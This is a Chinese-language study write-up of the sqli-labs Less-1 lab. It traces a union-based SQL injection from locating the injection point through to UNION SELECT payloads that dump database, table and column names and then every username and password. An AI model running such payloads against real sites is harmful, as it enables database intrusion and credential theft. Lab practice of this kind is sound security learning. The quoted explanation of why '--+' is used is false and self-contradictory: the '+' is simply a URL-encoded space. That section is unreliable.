# sqli靶场学习

## sqli-less1

![](./images/sqli1_1.png)
发现题目说请输入ID作为数值参数

![](./images/sqli1_2.png)
![](./images/sqli1_3.png)
判断是get传参，并且发现只有get传参传id而非ID才可有正常回显

![](./images/sqli1_4.png)
![](./images/sqli1_5.png)
输入?id=1 and 1=1 与?id=1 and 1=2 发现均有回显且没变化，考虑是字符型注入

![](./images/sqli1_6.png)
![](./images/sqli1_7.png)
id=1' and '1'='1回显正确id=1' and '1'='2回显错误（判断为【'】闭合）

---

### 注释妙用

查大佬的wp时候发现大佬用‘--+’注释掉后面的语句，而非使用‘--’，因此便查了一下，学到以下知识点：

> 1. `--` 这是MySQL中的一种单行注释方式。当你在SQL语句中使用 `--` 后跟一个空格时，它会注释掉 `--` 之后的所有内容，直到行尾。

> 2. `#` 这也是MySQL中的一种单行注释方式，用法与 `--` 类似，但它是用 `#` 开始，后面跟一个空格。

> 3. `/* ... */` 这是MySQL中的多行注释方式，可以注释掉一段跨多行的文本。

> 在SQL注入中，攻击者选择使用 `--+` 而不是 `--` 的原因通常与数据库的字符型字段处理有关。在某些情况下，如果数据库字段中已经包含了 `--` 作为数据的一部分，那么使用 `--` 作为注释符可能会导致注入的SQL语句被数据库提前注释掉，从而使得注入的恶意代码无法执行。例如，如果一个查询是这样的： 
```sql
SELECT * FROM users WHERE username = 'someUser' AND password = 'somePass--';
```

> 如果攻击者尝试注入 `--` 来注释掉 `somePass--` 后面的部分，整个密码字段 `somePass--` 都会被注释掉，因为数据库会认为 `--` 是注释的开始，而不是密码的一部分。

> 使用 `--+` 的目的是利用MySQL解析器的一个特性，即它在解析查询时会忽略 `--` 后面紧跟的任何非字母字符。因此，如果攻击者在 `--` 后面紧跟一个加号 `+`，MySQL解析器会认为 `--+` 是无效的注释，而不会将其视为注释的开始。这样，攻击者就可以绕过已经存在于查询中的 `--` 注释符，并且能够插入自己的恶意代码。

> 但这种方法需要数据库支持这种注释方式，并且需要攻击者对目标数据库的解析行为有足够的了解。在实际的SQL注入防御中，最好的策略是使用参数化查询（也称为预处理语句）来避免这类攻击，因为参数化查询会将数据和代码分开处理，从而防止SQL注入。

> 总之，`--+` 是MySQL中一种常见的单行注释方式，但需要注意使用它时需要确保数据库支持这种注释方式。
---

![](./images/sqli1_8.png)
此处用 order by 对前面的数据进行排列，先进行试数，发现只有三组数据，'order by 4–+就会超出，因此可以判断出有3个字段

---

### 特殊的SQL语句
>Union
>联合运算符⽤于组合两个或多个 SELECT 语句的结果。

>注意：每个语句中选择的列数必须相同。

>第⼀个 SELECT 语句中第⼀列的数据类型必须与第⼆个（第三个、第
四个…） SQL 语句的第⼀列的数据类型匹配 SELECT 语句。

>第⼀个 SELECT 语句中第⼆列的数据类型必须与第⼆个（第三个、第
四个…） SQL 语句的第⼆列的数据类型匹配 SELECT 语句。

---

![](./images/sqli1_9.png)
发现可以进行union联合注入那么用如下语句来进行注入

```sql
SELECT * FROM users WHERE id='-1' UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata LIMIT 0, 1 --+
```
> SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata：这是注入的查询。information_schema.schemata是MySQL中的一个特殊的数据库，它包含了服务器上所有数据库的信息。group_concat函数用于将多个行中的字段值连接成一个字符串。在这个查询中，它被用来获取所有数据库的名称，并将它们合并成一个单一的字符串。

> LIMIT 0, 1：这是用来限制查询结果的数量。LIMIT 0, 1表示只返回第一行数据，而不是所有,因为它可以减少被注入的查询对原始页面显示的影响，从而降低被发现的风险。

---

![](./images/sqli1_10.png)
得到所有数据库的名称

```sql
 SELECT * FROM users WHERE id='-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ LIMIT 0,1
```

![](./images/sqli1_11.png)
得到security数据库中的所有表

```sql
SELECT * FROM users WHERE id='-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = 'security' and table_name = 'users' --+ LIMIT 0,1
```
![](./images/sqli1_12.png)
得到users表中的所有列名

```sql
select 1,group_concat(username),group_concat(password) from security.users --+
```
![](./images/sqli1_13.png)
得到users表中的所有数据

### 总结

> 1. 判断注入点
> 2. 判断注入类型
> 3. 判断闭合方式（有关注释的知识点）
> 4. 判断字段数（有关union联合注入的知识点）
> 5. 获得数据库名称
> 6. 获得列名
> 7. 获取数据


